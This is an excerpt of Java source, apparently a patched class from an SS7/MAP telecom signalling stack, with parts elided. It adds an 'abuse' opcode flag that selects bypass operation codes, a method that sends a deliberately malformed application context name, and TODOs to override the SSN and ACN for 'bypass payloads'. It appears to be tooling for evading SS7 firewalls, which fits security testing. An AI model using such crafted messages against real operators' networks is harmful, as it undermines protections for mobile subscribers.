...
public abstract class MAPDialogImpl implements MAPDialog {
    ...
    public boolean getAbuseOpcodeTag() {
        return this.abuseOpcodeTag;
    }

    protected OperationCode createOperationCode() {
        return this.abuseOpcodeTag ? TcapFactory.createBypassOperationCode() : TcapFactory.createOperationCode();
    }
    // ########### TRX: PATCH END
    ...
    // ########### TRX: PATCH START
    public void sendMalformedAcn() throws MAPException {
        long[] acnIod = Arrays.copyOf(this.appCntx.getOID(), this.appCntx.getOID().length);
        acnIod[2] = 4l;
        ApplicationContextName acn = this.mapProviderImpl.getTCAPProvider().getDialogPrimitiveFactory()
                .createApplicationContextName(acnIod);
        send(acn);
    }
    // ########### TRX: PATCH END

    // ########### TRX: PATCH START
    public void send(MAPApplicationContext context) throws MAPException {
        ApplicationContextName acn = this.mapProviderImpl.getTCAPProvider().getDialogPrimitiveFactory()
                .createApplicationContextName(context.getOID());
        send(acn);
    }
    // ########### TRX: PATCH END

    public void send(ApplicationContextName contextName) throws MAPException {
        ...
        try {
            // ########### TRX: PATCH START
            // TODO: override called SSN here for bypass payloads
            // ########### TRX: PATCH END
            // ########### TRX: PATCH START
            // TODO: override ACN here for bypass payloads
            // ########### TRX: PATCH END
            this.getTcapDialog().getDialogLock().lock();
            ...
            switch (this.tcapDialog.getState()) {
                ...
                case Idle:
                    ApplicationContextName acn = contextName;
                ...
                case InitialReceived:
                    ...
                    ApplicationContextName acn1 = contextName;
